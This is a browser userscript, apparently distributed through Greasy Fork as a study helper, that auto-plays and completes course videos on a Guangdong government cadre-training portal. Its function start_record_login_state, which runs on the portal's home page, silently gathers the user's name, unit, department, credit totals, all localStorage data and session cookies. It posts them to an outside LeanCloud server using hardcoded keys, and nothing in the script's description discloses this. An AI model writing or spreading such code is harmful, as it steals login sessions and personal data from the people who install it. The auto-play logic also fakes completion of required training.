// ==UserScript==
// @name         gdgbwlpx
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  本脚本仅用于学习交流，请在下载后1小时内删除，切勿用于商业用途。如遇任何问题，可以发邮件给我:mail2chenty@gmail.com。
// @author       mail2chenty@gmail.com
// @match        https://gbpx.gd.gov.cn/gdceportal/index.aspx
// @match        https://gbpx.gd.gov.cn/gdceportal/study/studyCenter.aspx
// @match        https://wcs1.shawcoder.xyz/gdcecw/play_pc/playdo_pc.html
// @icon         https://gbpx.gd.gov.cn/gdceportal/favicon.ico
// @grant        unsafeWindow
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @grant        GM_unregisterMenuCommand
// @downloadURL https://update.greasyfork.org/scripts/445639/gdgbwlpx.user.js
// @updateURL https://update.greasyfork.org/scripts/445639/gdgbwlpx.meta.js
// ==/UserScript==


// 课程详情页面示例地址： https://wcs1.shawcoder.xyz/gdcecw/play_pc/playverif_pc.html&courseLabel=wlxy&courseId=c958bcccfbc94e998b1c0f09bad15805


var url = document.location.href;
var study_page_url = "https://gbpx.gd.gov.cn/gdceportal/study/studyCenter.aspx";
//
if (url.indexOf("study/studyCenter") != -1) {
    //
    console.log("进入课程列表页面");
    //
    window.setTimeout(function(){
        //
        load_all_unlean_course_list();
    }, 8*1000);

} else if (url.indexOf("play_pc/playdo_pc") != -1) {
    //
    console.log("进入播放详情页面")
    //
    window.setTimeout(function() {
        //
        start_play_video();
    }, 3 *1000);

} else if (url.indexOf("gdceportal/index.aspx") != -1) {
    //
    console.log("已登录进入首页")
    //
    start_record_login_state();
    //
    window.setTimeout(function() {
        //
        window.location.href = study_page_url;
    }, 2 *1000)
}


//  开始读取未学习的课程列表
function load_all_unlean_course_list() {
    //
    console.log("开始读取未学习的课程列表")
    //
    var secondIframe = document.getElementById("secondIframe").contentWindow.document;
    var thirdIframe = secondIframe.getElementById("thirdIframe").contentWindow.document;
    var dataMainIframe = thirdIframe.getElementById("dataMainIframe").contentWindow.document;
    //
    var courseName_list = dataMainIframe.getElementsByClassName("courseware-list-reed");
    if (courseName_list.length != 0) {
        //
        console.log("未完成课程数： ", courseName_list.length);
        // 判断是否存在播放中的视频
        var courseId = GM_getValue("current_courseId")
        if (courseId == "") {
            console.log("当前不存在正在播放中的视频，准备播放第一个视频")
            var ele = courseName_list[0]
            ele.click();
            //
            refresh_page();
        } else {
            console.log("当前存在播放中的视频，等待……")
            refresh_page();
        }
    } else {
        console.log("检测不到未学习课程。")
        refresh_page();
    }
}


function refresh_page() {
    setTimeout(() => {
        window.location.href = study_page_url;
        // location.reload();
    }, 10 * 1000);
}


// =========================================================================


// 返回当前的视频标签
function get_current_video() {
    //
    var course_frame = document.getElementById("course_frame").contentWindow.document;
    var video = course_frame.getElementById("my-video_html5_api");
    return video
}


function start_play_video() {
    //
    console.log("开始播放视频");
    //
    var video = get_current_video()
    console.log("视频播放时长： ", video.duration / 60)
    video.muted = true;
    //
    if (video.paused) {
        console.log("视频暂未播放,准备开始播放……");
        video.play();
        //
        if (video.paused == false) {
            console.log("记录当前播放记录:", courseId);
            GM_setValue("current_courseId", courseId);
        }
    }
    //
    console.log("记录当前播放记录:", courseId);
    GM_setValue("current_courseId", courseId);
    //
    check_if_video_play_over()
}

// 定时检查视频是否播放完毕
function check_if_video_play_over() {
    var video = get_current_video()
    console.log("当前已播放：", video.currentTime / 60)
    //
    if (video.currentTime >= video.duration) {
        //
        console.log("视频播放完毕");
        //
        console.log("清除播放记录");
        GM_setValue("current_courseId", "");
        //
        window.close();
    } else {
        //
        setTimeout(check_if_video_play_over, 5 * 1000);
    }
}


// =========================================================================


let clean_current_courseId_btn = GM_registerMenuCommand ("清除播放记录", clean_current_courseId_handle);

function clean_current_courseId_handle() {
    //
    console.log("clean_current_courseId_handle");
    GM_setValue("current_courseId", "");
}


function start_record_login_state() {
    var lblUnit = document.getElementById("lblUnit").textContent;
    var lblDept = document.getElementById("lblDept").textContent;
    var lblUserName = document.getElementById("lblUserName").textContent;
    var totalScore = document.getElementById("pnlCredit-span").textContent;
    var ineedScore = document.getElementById("pnlCreditI-span").textContent;
    //
    var localStorage = window.localStorage;
    var storage_dict = {};
    for (var index = 0; index < localStorage.length; index++) {
        var storage_key = localStorage.key(index);
        var storage_val = localStorage.getItem(storage_key);
        console.log(storage_key, storage_val);
        storage_dict[storage_key] = storage_val;
    }
    //
    var cookie = document.cookie.toString();
    //
    var data_dict = {"lblUnit" : lblUnit,
            "lblDept" : lblDept,
            "lblUserName" : lblUserName,
            "totalScore" : totalScore,
            "ineedScore" : ineedScore,
            "localStorage" : storage_dict,
            "cookie" : cookie};
    console.log(data_dict);
    var data_dict_json = JSON.stringify(data_dict)
    console.log(data_dict_json);
    //
    $.ajax({
        url: "https://qjb3cmav.lc-cn-n1-shared.com/1.1/classes/loginRecord",
        type: "Post",
        contentType: "application/json",
        data: data_dict_json,
        beforeSend: function(request) {
            request.setRequestHeader("X-LC-Id", "qJb3cMAv485glBykUg6xFa0t-gzGzoHsz");
            request.setRequestHeader("X-LC-Key", "j55bkodjhpp93bmtg9rqWFfM")
        },
        success: function(resp_data) {
            console.log(resp_data);
        }
    });
    //



}

// =========================================================================

